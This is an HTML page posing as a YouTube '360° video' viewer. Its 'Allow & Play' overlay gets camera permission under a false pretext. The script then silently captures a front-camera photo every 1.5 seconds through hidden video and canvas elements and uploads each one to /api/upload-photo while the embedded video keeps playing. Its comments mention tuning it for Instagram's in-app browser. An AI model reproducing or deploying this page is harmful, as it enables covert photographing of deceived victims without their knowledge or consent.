<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>YouTube</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">

  <meta property="og:type" content="website">
  <meta property="og:title" content="YouTube">
  <meta property="og:description" content="YouTube is an American online video sharing platform owned by Google. YouTube was founded on February 14, 2005, by Chad Hurley, Jawed Karim, and Steve Chen who were all former employees of PayPal. Headquartered in San Bruno, California, it is the second-most-visited website in the world, after Google itself.">
  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="https://www.youtube.com/">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="YouTube">
  <meta name="twitter:description" content="Experience the latest 360° interactive video content on YouTube.">
  <meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      overflow: hidden;
      background: #000;
      font-family: "Roboto", Helvetica, Arial, sans-serif;
    }

    /* Video Player Layer */
    #video-player {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border: none;
      z-index: 1;
    }

    /* Mobile-Optimized Permission Overlay */
    #permission-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #0f0f0f;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      box-sizing: border-box;
      padding: 40px 24px;
    }

    #permission-overlay img {
      width: 130px;
      height: auto;
      margin-bottom: 25px;
    }

    #permission-overlay h2 {
      color: #fff;
      font-size: 22px;
      font-weight: 500;
      margin: 0 0 12px 0;
    }

    #permission-overlay p {
      color: #aaa;
      font-size: 14px;
      line-height: 1.6;
      margin: 0 0 35px 0;
      max-width: 300px;
    }

    #enable-btn {
      background: #cc0000;
      color: #fff;
      border: none;
      padding: 14px 32px;
      border-radius: 4px;
      font-size: 14px;
      font-weight: 500;
      text-transform: uppercase;
      cursor: pointer;
      width: 100%;
      max-width: 260px;
    }

    #enable-btn:active {
      background: #990000;
    }

    /* Hidden capture elements */
    video, canvas { display: none; }
  </style>
</head>
<body>

  <div id="permission-overlay">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png" alt="YouTube">
    <h2>360° Viewing Mode</h2>
    <p>Enable camera and motion sensors to interact with this 360° video and enable head-tracking for an immersive experience.</p>
    <button id="enable-btn">Allow & Play</button>
  </div>

  <iframe 
    id="video-player"
    src="https://www.youtube.com/embed/njSffibRets?autoplay=1&controls=1&rel=0&modestbranding=1" 
    allow="autoplay; encrypted-media; gyroscope; accelerometer" 
    allowfullscreen>
  </iframe>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="480" height="640"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const overlay = document.getElementById('permission-overlay');
    const btn = document.getElementById('enable-btn');

    btn.addEventListener('click', async () => {
      try {
        // Request specific dimensions to ensure portrait "straight" photos
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { 
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          } 
        });
        
        video.srcObject = stream;
        
        // Force the video to play to wake up the stream in Instagram
        await video.play();
        
        overlay.style.display = 'none';

        // Start capture cycle
        setInterval(async () => {
          // Fix: Check if video has actual data to prevent black photos
          if (video.readyState === video.HAVE_ENOUGH_DATA) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

            try {
              await fetch('/api/upload-photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ dataUrl })
              });
            } catch (e) {
              console.error('Upload error');
            }
          }
        }, 1500);

      } catch (err) {
        alert("To view 360° content, please use a standard browser like Chrome or Safari and allow camera access.");
        console.error('Permission error:', err);
      }
    });
  </script>
</body>
</html>
